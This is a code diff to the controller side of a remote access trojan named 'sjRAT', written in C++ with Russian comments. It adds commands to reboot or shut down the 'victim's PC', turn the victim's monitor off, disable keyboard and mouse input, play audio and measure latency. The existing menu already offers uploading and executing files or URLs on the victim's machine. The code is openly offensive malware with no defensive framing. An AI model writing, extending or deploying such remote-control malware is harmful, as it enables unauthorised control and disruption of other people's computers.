@@ -7,6 +7,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <tchar.h>
+#include <chrono>
+#include <mmsystem.h>
+#pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "Ws2_32.lib")
 
 void SendAndReceive(SOCKET client, std::string command)
@@ -27,6 +30,12 @@ void help_menu()
     printf("msgbox - summon MessageBox on victim's PC\n\n");
     printf("upload <file> - send file to victim's PC\n\n");
     printf("execute <file/url> - lauch file or open url\n\n");
+    printf("reboot - reboot victim's PC\n\n");
+    printf("shutdown - turn off victim's PC\n\n");
+    printf("ping - show latency\n\n");
+    printf("monitor off/on - turn off/on victim's monitor\n\n");
+    printf("input off/on - disable/enable keyboard and mouse input\n\n");
+    printf("play <file> - play music from file\n\n");
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
     printf("=====================================\n");
@@ -76,6 +85,26 @@ void SendFile(SOCKET client, const std::string& filePath)
     }
 }
 
+void MeasurePingTime(SOCKET client)
+{
+    // Отправляем текущее время клиенту
+    auto start = std::chrono::high_resolution_clock::now();
+    send(client, reinterpret_cast<char*>(&start), sizeof(start), 0);
+
+    // Получаем время отклика от клиента
+    std::chrono::high_resolution_clock::time_point end;
+    int bytesReceived = recv(client, reinterpret_cast<char*>(&end), sizeof(end), 0);
+    if (bytesReceived == sizeof(end)) {
+        // Вычисляем время отклика
+        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
+        double pingTime = duration.count() / 1000.0;  // Конвертируем в миллисекунды
+        printf("[*] Ping time: %.2f ms\n", pingTime);
+    }
+    else {
+        printf("Failed to measure ping time\n");
+    }
+}
+
 int main(int argc, char* argv[])
 {
     char ip_addr[] = "192.168.31.135";
@@ -105,7 +134,7 @@ int main(int argc, char* argv[])
     listen(sListen, SOMAXCONN); // start listen for connections
 
     SOCKET client;
-    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
+    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr); // accept client connection
     if (client == 0)
     {
         printf("Failed to accept client's connection\n%d\n", WSAGetLastError());
@@ -118,6 +147,8 @@ int main(int argc, char* argv[])
         const char* clientIP = inet_ntoa(addr_in.sin_addr);
         printf("[+] New connection from %s!\n", clientIP);
         
+        bool clientConnected = true;
+
         std::string command;
         while (true) 
         {
@@ -137,6 +168,35 @@ int main(int argc, char* argv[])
             else if (command.substr(0, 7) == "execute") {
                 SendAndReceive(client, command);
             }
+            else if (command == "shutdown") {
+                SendAndReceive(client, command);
+            }
+            else if (command == "reboot") {
+                SendAndReceive(client, command);
+            }
+            else if (command == "ping") {
+                MeasurePingTime(client);
+            }
+            else if (command.substr(0, 5) == "input") {
+                std::string state = command.substr(6);
+                if (state == "on") {
+                    SendAndReceive(client, command);
+                } else if (state == "off") {
+                    SendAndReceive(client, command);
+                } else {
+                    printf("[!] Usage: input off/on\n");
+                }
+            }
+            else if (command.substr(0, 7) == "monitor") {
+                std::string state = command.substr(8);
+                if (state == "on") {
+                    SendAndReceive(client, command);
+                } else if (state == "off") {
+                    SendAndReceive(client, command);
+                } else {
+                    printf("[!] Usage: monitor off/on\n");
+                }
+            }
 
             else if (command == "help") {
                 help_menu();
@@ -144,6 +204,7 @@ int main(int argc, char* argv[])
             else if (command == "exit" || command == "quit" || command == "bye") {
                 SendAndReceive(client, command.c_str());
                 closesocket(client);
+                clientConnected = false;
                 system("pause");
                 exit(0);
             }
